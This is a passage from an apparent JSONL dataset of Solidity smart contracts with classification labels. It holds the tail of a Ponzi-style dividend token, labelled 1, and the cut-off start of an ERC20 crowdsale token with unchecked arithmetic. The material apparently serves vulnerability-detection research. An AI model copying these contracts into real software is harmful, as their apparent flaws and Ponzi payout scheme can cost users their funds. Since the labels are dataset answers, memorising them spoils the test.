(balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\r\r\n\t\tmsg.sender.transfer(balance);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Converts the Ether accrued as dividends back into EPY tokens without having to\r\r\n\r\r\n\t\/\/ withdraw it first. Saves on gas and potential price spike loss.\r\r\n\r\r\n\tfunction reinvestDividends() public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\t\/\/ Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Assign balance to a new variable.\r\r\n\r\r\n\t\tuint value_ = (uint) (balance);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ If your dividends are worth less than 1 szabo, or more than a million Ether\r\r\n\r\r\n\t\t\/\/ (in which case, why are you even here), abort.\r\r\n\r\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\r\r\n\t\tvar sender = msg.sender;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ A temporary reserve variable used for calculating the reward the holder gets for buying tokens.\r\r\n\r\r\n\t\t\/\/ (Yes, the buyer receives a part of the distribution as well!)\r\r\n\r\r\n\t\tvar res = reserve() - balance;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\r\r\n\t\tvar fee = div(value_, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\r\r\n\t\tvar numEther = value_ - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\r\r\n\t\tvar numTokens = calculateDividendTokens(numEther, balance);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\r\r\n\t\t\tvar bonusCoEff =\r\r\n\r\r\n\t\t\t    (scaleFactor - (res + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\r\r\n\t\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\r\r\n\t\tvar payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Sells your tokens for Ether. This Ether is assigned to the callers entry\r\r\n\r\r\n\t\/\/ in the tokenBalance array, and therefore is shown as a dividend. A second\r\r\n\r\r\n\t\/\/ call to withdraw() must be made to invoke the transfer of Ether back to your address.\r\r\n\r\r\n\tfunction sellMyTokens() public {\r\r\n\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\r\r\n\t\tsell(balance);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately\r\r\n\r\r\n\t\/\/ invokes the withdraw() function, sending the resulting Ether to the callers address.\r\r\n\r\r\n    function getMeOutOfHere() public {\r\r\n\r\r\n\t\tsellMyTokens();\r\r\n\r\r\n        withdraw();\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Gatekeeper function to check if the amount of Ether being sent isn't either\r\r\n\r\r\n\t\/\/ too small or too large. If it passes, goes direct to buy().\r\r\n\r\r\n\tfunction fund() payable public {\r\r\n\r\r\n\t\t\/\/ Don't allow for funding if the amount of Ether sent is less than 1 szabo.\r\r\n\r\r\n\t\tif (msg.value > 0.000001 ether) {\r\r\n\r\r\n\t\t    contractBalance = add(contractBalance, msg.value);\r\r\n\r\r\n\t\t\tbuy();\r\r\n\r\r\n\t\t} else {\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t}\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of buying a finney worth of tokens.\r\r\n\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of selling a single token.\r\r\n\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n\r\r\n        var eth = getEtherForTokens(1 finney);\r\r\n\r\r\n        var fee = div(eth, 10);\r\r\n\r\r\n        return eth - fee;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Calculate the current dividends associated with the caller address. This is the net result\r\r\n\r\r\n\t\/\/ of multiplying the number of tokens held by their current value in Ether and subtracting the\r\r\n\r\r\n\t\/\/ Ether that has already been paid out.\r\r\n\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\r\r\n\t\treturn (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) \/ scaleFactor;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Version of withdraw that extracts the dividends and sends the Ether to the caller.\r\r\n\r\r\n\t\/\/ This is only used in the case when there is no transaction data, and that should be\r\r\n\r\r\n\t\/\/ quite rare unless interacting directly with the smart contract.\r\r\n\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\r\r\n\t\tto.transfer(balance);\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Internal balance function, used to calculate the dynamic reserve value.\r\r\n\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\r\r\n\t\treturn contractBalance - msg.value;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\r\r\n\t\t\/\/ Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.\r\r\n\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t\t\t\t\t\r\r\n\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\r\r\n\t\tvar sender = msg.sender;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\r\r\n\t\tvar fee = div(msg.value, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\r\r\n\t\t\tvar bonusCoEff =\r\r\n\r\r\n\t\t\t    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\r\r\n\t\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\r\r\n\t\tvar payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee\r\r\n\r\r\n\t\/\/ to discouraging dumping, and means that if someone near the top sells, the fee distributed\r\r\n\r\r\n\t\/\/ will be *significant*.\r\r\n\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\r\r\n\t    \/\/ Calculate the amount of Ether that the holders tokens sell for at the current sell price.\r\r\n\r\r\n\t\tvar numEthersBeforeFee = getEtherForTokens(amount);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ 10% of the resulting Ether is used to pay remaining holders.\r\r\n\r\r\n        var fee = div(numEthersBeforeFee, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Net Ether for the seller after the fee has been subtracted.\r\r\n\r\r\n        var numEthers = numEthersBeforeFee - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ *Remove* the numTokens which were just sold from the total supply. We're \/definitely\/ a crypto central bank.\r\r\n\r\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\r\n\r\r\n\t\t\r\r\n\r\r\n        \/\/ Remove the tokens from the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);\r\r\n\r\r\n\r\r\n\r\r\n        \/\/ Update the payout array so that the seller cannot claim future dividends unless they buy back in.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the seller...\r\r\n\r\r\n\t\tvar payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));\r\r\n\r\r\n\t\t\r\r\n\r\r\n        \/\/ We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,\r\r\n\r\r\n\t\t\/\/ since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if\r\r\n\r\r\n\t\t\/\/ they decide to buy back in.\r\r\n\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\t\t\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Decrease the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n        totalPayouts -= payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this is a bit of an irrelevant check since we're\r\r\n\r\r\n\t\t\/\/ selling tokens, but it guards against division by zero).\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Scale the Ether taken as the selling fee by the scaleFactor variable.\r\r\n\r\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all remaining token holders.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this sell.\r\r\n\r\r\n\t\t\tvar rewardPerShare = etherFee \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken = add(earningsPerToken, rewardPerShare);\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t}\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ Dynamic value of Ether in reserve, according to the CRR requirement.\r\r\n\r\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\r\n\r\r\n\t\treturn sub(balance(),\r\r\n\r\r\n\t\t\t ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) \/ scaleFactor));\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Calculates the number of tokens that can be bought for a given amount of Ether, according to the\r\r\n\r\r\n\t\/\/ dynamic reserve and totalSupply values (derived from the buy and sell prices).\r\r\n\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.\r\r\n\r\r\n\tfunction calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {\r\r\n\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Converts a number tokens into an Ether value.\r\r\n\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\r\r\n\t\t\/\/ How much reserve Ether do we have left in the contract?\r\r\n\r\r\n\t\tvar reserveAmount = reserve();\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.\r\r\n\r\r\n\t\tif (tokens == totalSupply)\r\r\n\r\r\n\t\t\treturn reserveAmount;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ If there would be excess Ether left after the transaction this is called within, return the Ether\r\r\n\r\r\n\t\t\/\/ corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found\r\r\n\r\r\n\t\t\/\/ at https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/ in the third equation, with the CRR numerator \r\r\n\r\r\n\t\t\/\/ and denominator altered to 1 and 2 respectively.\r\r\n\r\r\n\t\treturn sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d\/crr_n));\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ You don't care about these, but if you really do they're hex values for \r\r\n\r\r\n\t\/\/ co-efficients used to simulate approximations of the log and exp functions.\r\r\n\r\r\n\tint256  constant one        = 0x10000000000000000;\r\r\n\r\r\n\tuint256 constant sqrt2      = 0x16a09e667f3bcc908;\r\r\n\r\r\n\tuint256 constant sqrtdot5   = 0x0b504f333f9de6484;\r\r\n\r\r\n\tint256  constant ln2        = 0x0b17217f7d1cf79ac;\r\r\n\r\r\n\tint256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;\r\r\n\r\r\n\tint256  constant c1         = 0x1ffffffffff9dac9b;\r\r\n\r\r\n\tint256  constant c3         = 0x0aaaaaaac16877908;\r\r\n\r\r\n\tint256  constant c5         = 0x0666664e5e9fa0c99;\r\r\n\r\r\n\tint256  constant c7         = 0x049254026a7630acf;\r\r\n\r\r\n\tint256  constant c9         = 0x038bd75ed37753d68;\r\r\n\r\r\n\tint256  constant c11        = 0x03284a0c14610924f;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\r\r\n\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\r\r\n\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\r\r\n\t\tint32 scale = 0;\r\r\n\r\r\n\t\twhile (a > sqrt2) {\r\r\n\r\r\n\t\t\ta \/= 2;\r\r\n\r\r\n\t\t\tscale++;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\r\r\n\t\t\ta *= 2;\r\r\n\r\r\n\t\t\tscale--;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\r\r\n\t\treturn scale * ln2 +\r\r\n\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\r\r\n\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\r\r\n\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\r\r\n\t\ta -= scale*ln2;\r\r\n\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\r\r\n\t\tif (scale >= 0)\r\r\n\r\r\n\t\t\texp <<= scale;\r\r\n\r\r\n\t\telse\r\r\n\r\r\n\t\t\texp >>= -scale;\r\r\n\r\r\n\t\treturn exp;\r\r\n\r\r\n\t}\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ The below are safemath implementations of the four arithmetic operators\r\r\n\r\r\n\t\/\/ designed to explicitly prevent over- and under-flows of integer values.\r\r\n\r\r\n\r\r\n\r\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tif (a == 0) {\r\r\n\r\r\n\t\t\treturn 0;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\tuint256 c = a * b;\r\r\n\r\r\n\t\tassert(c \/ a == b);\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\t\/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n\r\r\n\t\tuint256 c = a \/ b;\r\r\n\r\r\n\t\t\/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn't hold\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tassert(b <= a);\r\r\n\r\r\n\t\treturn a - b;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tuint256 c = a + b;\r\r\n\r\r\n\t\tassert(c >= a);\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ This allows you to buy tokens by sending Ether directly to the smart contract\r\r\n\r\r\n\t\/\/ without including any transaction data (useful for, say, mobile wallet apps).\r\r\n\r\r\n\tfunction () payable public {\r\r\n\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\r\r\n\t\tif (msg.value > 0) {\r\r\n\r\r\n\t\t\tfund();\r\r\n\r\r\n\t\t} else {\r\r\n\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t}\r\r\n\r\r\n}","label":1}
{"code":"pragma solidity 0.4.11;\r\r\n\r\r\ncontract ERC20 {\r\r\n    function totalSupply() constant returns (uint256 totalSupply) {}\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\r\n    function transfer(address _recipient, uint256 _value) returns (bool success) {}\r\r\n    function transferFrom(address _from, address _recipient, uint256 _value) returns (bool success) {}\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _recipient, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\ncontract StandardToken is ERC20 {\r\r\n\r\r\n\tuint256 public totalSupply;\r\r\n\tmapping (address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n    \r\r\n    modifier when_can_transfer(address _from, uint256 _value) {\r\r\n        if (balances[_from] >= _value) _;\r\r\n    }\r\r\n\r\r\n    modifier when_can_receive(address _recipient, uint256 _value) {\r\r\n        if (balances[_recipient] + _value > balances[_recipient]) _;\r\r\n    }\r\r\n\r\r\n    modifier when_is_allowed(address _from, address _delegate, uint256 _value) {\r\r\n        if (allowed[_from][_delegate] >= _value) _;\r\r\n    }\r\r\n\r\r\n    function transfer(address _recipient, uint256 _value)\r\r\n        when_can_transfer(msg.sender, _value)\r\r\n        when_can_receive(_recipient, _value)\r\r\n        returns (bool o_success)\r\r\n    {\r\r\n        balances[msg.sender] -= _value;\r\r\n        balances[_recipient] += _value;\r\r\n        Transfer(msg.sender, _recipient, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _recipient, uint256 _value)\r\r\n        when_can_transfer(_from, _value)\r\r\n        when_can_receive(_recipient, _value)\r\r\n        when_is_allowed(_from, msg.sender, _value)\r\r\n        returns (bool o_success)\r\r\n    {\r\r\n        allowed[_from][msg.sender] -= _value;\r\r\n        balances[_from] -= _value;\r\r\n        balances[_recipient] += _value;\r\r\n        Transfer(_from, _recipient, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) returns (bool o_success) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 o_remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract GECToken is StandardToken {\r\r\n\r\r\n\t\/\/FIELDS\r\r\n\tstring public name = \"GECoin\";\r\r\n    string public symbol = \"GEC\";\r\r\n    uint public decimals = 3;\r\r\n\r\r\n\t\/\/INITIALIZATION\r\r\n\taddress public minter; \/\/address that able to mint new tokens\r\r\n\tuint public icoEndTime; \r\r\n\r\r\n\tuint illiquidBalance_amount;\r\r\n\tmapping (uint => address) illiquidBalance_index;\r\r\n\tmapping (address => uint) public illiquidBalance; \/\/Balance of &#39;Frozen funds&#39;\r\r\n\r\r\n\t\/\/ called by crowdsale contract\r\r\n\tmodifier only_minter {\r\r\n\t\tif (msg.sender != minter) throw;\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Token can be transferred immediately after crowdsale.\r\r\n\tmodifier when_transferable {\r\r\n\t\tif (now <= icoEndTime) throw;\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Can only be called if the `crowdfunder` is allowed to mint tokens. Any\r\r\n\t\/\/ time before `endMintingTime`.\r\r\n\tmodifier when_mintable {\r\r\n\t\tif (now > icoEndTime + 10 days) throw;\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Initialization contract assigns address of crowdfund contract and end time.\r\r\n\tfunction GECToken (address _minter, uint _icoEndTime) {\r\r\n\t\tminter = _minter;\r\r\n\t\ticoEndTime = _icoEndTime;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Create new tokens when called by the crowdfund contract.\r\r\n\t\/\/ Only callable before the end time.\r\r\n\tfunction createToken(address _recipient, uint _value)\r\r\n\t\twhen_mintable\r\r\n\t\tonly_minter\r\r\n\t\treturns (bool o_success)\r\r\n\t{\r\r\n\t\tbalances[_recipient] += _value;\r\r\n\t\ttotalSupply += _value;\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Create an illiquidBalance which 